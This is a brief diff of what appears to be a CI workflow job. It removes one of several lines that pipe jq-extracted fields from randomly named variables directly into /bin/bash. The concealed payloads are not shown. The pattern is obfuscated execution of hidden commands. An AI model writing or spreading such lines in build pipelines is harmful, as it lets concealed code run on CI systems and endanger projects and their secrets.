@@ -20,7 +20,6 @@ jobs:
           echo $uph01 | jq -r .b2 | /bin/bash
           echo $wgmpv5036 | jq -r .vpvm6 | /bin/bash
           printf '%s' "$bbeix2" | jq -r .sfb69848 | /bin/bash
-          printf '%s' "$gw2" | jq -r .zkpen54 | /bin/bash
           echo $ghcc018 | jq -r .dwrdx253 | /bin/bash
           printf '%s' "$f70044" | jq -r .spm12 | /bin/bash
           printf '%s' "$la230" | jq -r .hppt58 | /bin/bash
